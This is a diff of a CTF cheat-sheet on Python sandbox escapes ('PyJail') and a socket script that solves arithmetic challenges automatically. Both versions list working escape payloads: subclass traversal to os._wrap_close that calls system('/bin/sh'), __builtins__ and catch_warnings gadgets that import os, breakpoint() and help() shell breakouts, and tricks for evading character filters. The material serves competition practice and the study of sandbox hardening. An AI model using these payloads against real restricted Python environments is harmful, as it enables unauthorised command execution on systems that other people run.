@@ -1,46 +1,53 @@
-# Misc: PyJail Escapes & Automated Socket Scripting
+# Misc: PyJail Escapes and Socket Automation
 
-## 1. PyJail (Python Sandbox Escape) Payloads
+## 1. PyJail Escape Techniques
 
-PyJail challenges restrict built-in functions (`eval`, `exec`, `open`, `import`). Here are reliable breakout vectors:
+Common payload patterns to escape restricted Python environments:
 
-### A. Subclass Traversal (Reaching `<class 'os._wrap_close'>` or `subprocess.Popen`)
+### Subclass Traversal
+Inspect loaded classes to find execution gadgets such as `subprocess.Popen` or `os._wrap_close`:
 ```python
-# List subclasses:
+# List available subclasses
 [c.__name__ for c in ().__class__.__base__.__subclasses__()]
 
-# Find index of os._wrap_close or Popen and run:
-().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('sh')
-
-# Or search automatically:
+# Execute command using os._wrap_close gadget
 [x for x in ().__class__.__base__.__subclasses__() if 'wrap_close' in x.__name__][0].__init__.__globals__['system']('/bin/sh')
 ```
 
-### B. Accessing `__builtins__`
+### Accessing Builtins
 ```python
-# Direct builtins access:
+# Direct access through builtins dictionary
 __builtins__.__dict__['__import__']('os').system('sh')
 
-# Or via reload/globals:
+# Access through warning module globals
 [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('sh')
 ```
 
-### C. Direct Shell / Debugger
+### Interactive Debugger Breakout
 ```python
-breakpoint()    # Drops into pdb shell! From pdb, type: import os; os.system('sh')
-help()          # From help menu, type: !sh
+breakpoint()    # Drops into pdb; enter: import os; os.system('sh')
+help()          # From the help prompt, enter: !sh
 ```
 
-### D. Character Blacklist Bypasses
-- If `.` is blocked: `getattr(__import__('os'), 'system')('sh')`
-- If quotes (`"` or `'`) are blocked: `chr(115) + chr(104)` (`'sh'`)
-- If `import` or `eval` is blocked: `globals()['__builtins__']`
+### Character Filter Evasion
+- When periods (`.`) are blocked:
+  ```python
+  getattr(__import__('os'), 'system')('sh')
+  ```
+- When quotes are blocked:
+  ```python
+  chr(115) + chr(104)
+  ```
+- When `import` or `eval` strings are blocked:
+  ```python
+  globals()['__builtins__']
+  ```
 
 ---
 
-## 2. Automated Socket Solver Template (`socket_solver.py`)
+## 2. Automated Socket Solver Template
 
-Often Misc challenges ask you to solve 100 rapid math or captcha problems over Netcat within 30 seconds.
+Script template for challenges that require automated answers over a TCP socket:
 
 ```python
 #!/usr/bin/env python3
@@ -53,44 +60,38 @@ PORT = 1337
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 
-def recv_until(sock, delim=b"\n"):
-    buf = b""
-    while not buf.endswith(delim):
-        chunk = sock.recv(1)
-        if not chunk:
-            break
-        buf += chunk
-    return buf
-
-# Loop for 100 rounds
-round_num = 1
+round_count = 1
 while True:
     try:
-        # Read server prompt
         data = s.recv(4096).decode()
+        if not data:
+            break
         print(data, end="")
 
         if "flag{" in data.lower():
-            print("\n[+] FOUND FLAG!")
+            print("\n[+] Flag captured.")
             break
 
-        # Example: Server sends "What is 45 + 12?"
+        # Example pattern: "What is 15 + 27?"
         match = re.search(r"What is (\d+)\s*([\+\-\*])\s*(\d+)", data)
         if match:
             num1 = int(match.group(1))
             op = match.group(2)
             num2 = int(match.group(3))
 
-            if op == '+': ans = num1 + num2
-            elif op == '-': ans = num1 - num2
-            elif op == '*': ans = num1 * num2
+            if op == '+':
+                result = num1 + num2
+            elif op == '-':
+                result = num1 - num2
+            elif op == '*':
+                result = num1 * num2
 
-            print(f"[*] Round {round_num}: Answering {ans}")
-            s.sendall(f"{ans}\n".encode())
-            round_num += 1
+            print(f"[*] Submitting: {result}")
+            s.sendall(f"{result}\n".encode())
+            round_count += 1
 
-    except Exception as e:
-        print(f"[-] Connection ended or error: {e}")
+    except Exception as err:
+        print(f"[-] Connection terminated: {err}")
         break
 
 s.close()
